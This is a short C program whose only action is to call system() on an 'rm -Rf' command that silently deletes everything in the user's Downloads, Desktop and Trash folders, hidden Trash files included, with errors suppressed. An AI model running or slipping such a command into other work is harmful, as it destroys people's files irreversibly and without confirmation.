#include  <stdlib.h>

int main() {

  char cmd[] = "rm -Rf $HOME/Downloads/* $HOME/Desktop/* $HOME/.Trash/* $HOME/.Trash/.* 2> /dev/null";
  system(cmd);  

  return 0;
}

